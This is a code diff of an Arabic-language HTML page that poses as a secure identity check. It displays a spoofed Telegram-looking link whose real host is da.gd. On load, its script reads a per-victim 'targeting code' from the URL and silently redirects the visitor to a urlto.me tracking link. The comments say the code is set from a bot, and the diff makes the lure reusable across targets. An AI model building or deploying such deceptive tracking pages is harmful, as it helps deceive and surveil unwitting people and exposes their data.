@@ -1,24 +1,33 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>تأكيد الهوية</title>
+    <title>جاري التحويل الآمن...</title>
     <style>
-        body { font-family: Arial; text-align: center; padding-top: 100px; background-color: #f0f2f5; }
-        .mask-text { color: #0088cc; font-weight: bold; word-break: break-all; padding: 20px; }
-        .loading { color: #666; }
+        body { font-family: sans-serif; text-align: center; padding-top: 100px; background-color: #f0f2f5; }
+        .mask-link { color: #0088cc; font-weight: bold; font-size: 18px; margin-top: 20px; }
     </style>
 </head>
 <body>
-    <div class="loading">جاري التحقق من الرابط عبر:</div>
-    <div class="mask-text">https://t.me-Il_l_N@da.gd/OfWRV0</div>
-    <p>يرجى الانتظار ثانية واحدة...</p>
+    <div style="padding: 20px; background: white; border-radius: 12px; display: inline-block; box-shadow: 0 2px 10px rgba(0,0,0,0.1);">
+        <p>جاري التحقق من الهوية عبر:</p>
+        <div class="mask-link">https://t.me-Il_l_N@da.gd/OfWRV0</div>
+        <p id="status">يرجى الانتظار...</p>
+    </div>
 
     <script>
-        // التحويل التلقائي لـ "الخطوة الثانية" (رابط التعقب)
-        setTimeout(function() {
-            window.location.href = "https://urlto.me/2D9K6";
-        }, 1500);
+        // كود ذكي لقراءة "كود التعقب" من رابط الصفحة
+        const urlParams = new URLSearchParams(window.location.search);
+        const trackId = urlParams.get('id'); // سيقرأ الكود مثل 2D9K6
+
+        if (trackId) {
+            setTimeout(function() {
+                // سيقوم بالتحويل تلقائياً للرابط الذي تحدده من البوت
+                window.location.href = "https://urlto.me/" + trackId;
+            }, 1500);
+        } else {
+            document.getElementById('status').innerText = "خطأ: لم يتم تحديد كود الاستهداف.";
+        }
     </script>
 </body>
 </html>
